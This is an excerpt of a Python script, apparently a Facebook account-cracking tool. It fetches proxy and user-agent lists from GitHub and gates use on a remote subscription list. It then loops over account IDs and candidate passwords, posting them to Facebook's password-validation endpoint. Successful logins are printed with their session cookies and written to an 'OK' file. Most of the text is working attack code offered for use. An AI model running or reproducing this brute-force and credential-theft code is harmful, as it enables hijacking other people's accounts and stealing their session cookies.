...
os.system(f'xdg-opehttps://www.facebook.com/profile.php?id=100078014552659n )
time.sleep(6)
print("")
print("")
...
time.sleep(6)
os.system(f'xdg-open https://github.com/RahadHack99')
print("")
print("")
...
princp=[]
url = 'https://raw.githubusercontent.com/Rahad2nd/XLM/main/prox.txt'
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Rahad2nd/XLM/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
...
logo =""" 
     \033[0;95m  AKASH
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;45m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;36m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
║ [●]  ᴀᴜᴛʜᴏʀ        :          ℳℛ ℛᎯℋᎯⅅ      ║ 
║ [●]  Ғαcɛвσσκ      :          ᴿᴬᴴᴬᴰᵀᴼᴼᴸˢ    ║    
...
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://raw.githubusercontent.com/Rahad2nd/XLM/main/Bnb.txt").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m Rahad TooLs Daily Update)✅ \033[0;92m")
        ...
        tks = f'https://wa.me/+8801713939228?text={message}'
...
uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m TYPE YOUR CORRECT NAME\033[1;91m: \33[1;32m')
os.system(f"espeak \"Hey.  ,{uname} ,   , Welcome. ,To.     ,our.      ,Tools\"")
pass
...
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :    \033[1;43m\033[1;95m"+uname)
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r{bo}[{uname}-M1] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;90m[{uname}-Cp] {idf} • {pw}')
                os.system(f"espeak \"{uname}     ,Cp.    ,   id\"")
                ...
                print(f'\r\033[0;92m[{uname}-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;96m{kuki} ')
                print('')
                os.system(f"espeak \"{uname}     ,Ok.    ,   id\"")
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r{bo}[RAHAD-M2] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;90m[Rahad-Cp] {idf} • {pw}')
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[Rahad-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;96m{kuki} ')
                print('')
                os.system('espeak -a 300 " Rahad,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
